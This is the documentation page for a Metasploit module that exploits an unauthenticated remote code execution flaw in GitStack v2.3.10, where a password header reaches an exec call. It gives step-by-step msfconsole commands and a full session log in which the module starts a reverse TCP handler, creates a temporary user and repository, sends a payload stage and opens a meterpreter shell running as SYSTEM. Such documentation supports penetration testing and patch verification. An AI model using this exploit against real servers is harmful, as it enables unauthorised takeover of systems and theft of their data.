## Description

An unauthenticated remote code execution vulnerability exists in GitStack through v2.3.10. This
module exploits the vulnerability by sending unauthenticated REST API requests to put the
application in a vulnerable state, if needed, before sending a request to trigger the exploit.
These configuration changes are undone before the module exits. The module has been tested on
GitStack v2.3.10.

## Vulnerable Application

In vulnerable versions of GitStack, a flaw in `Authentication.class.php` allows [unauthenticated remote code execution](https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html) since `$_SERVER['PHP_AUTH_PW']` is passed directly to an `exec` function.

To exploit the vulnerability, the repository web interface must be enabled, a repository must
exist, and a user must have access to the repository.

Note: A passwd file should be created by GitStack for local user accounts.
Default location: `C:\GitStack\data\passwdfile`.

## Verification Steps

* Install a vulnerable GitStack application
* `./msfconsole`
* `use exploit/windows/http/gitstack_rce`
* `set rhost <rhost>`
* `set verbose true`
8 `run`

Note: You may have to run the exploit multiple times since the powershell that is generate has to
be under a certain size.

## Scenarios

### GitStack v2.3.10 on Windows 7 SP1

```
msf5 > use exploit/windows/http/gitstack_rce
msf5 exploit(windows/http/gitstack_rce) > set rhost 172.22.222.122
rhost => 172.22.222.122
msf5 exploit(windows/http/gitstack_rce) > set verbose true
verbose => true
msf5 exploit(windows/http/gitstack_rce) > run

[*] Started reverse TCP handler on 172.22.222.131:4444 
[*] Powershell command length: 6103
[-] Web interface is disabled
[-] No repositories found
[+] Web interface successfully enabled
[+] The repository has been successfully created
[+] Created user: ZROTE
[+] User ZROTE added to EsILm
[*] Sending stage (252483 bytes) to 172.22.222.122
[+] ZROTE removed from EsILm
[+] ZROTE has been deleted
[+] Web interface successfully disabled
[+] EsILm has been deleted

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-V438RLMESAE
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```
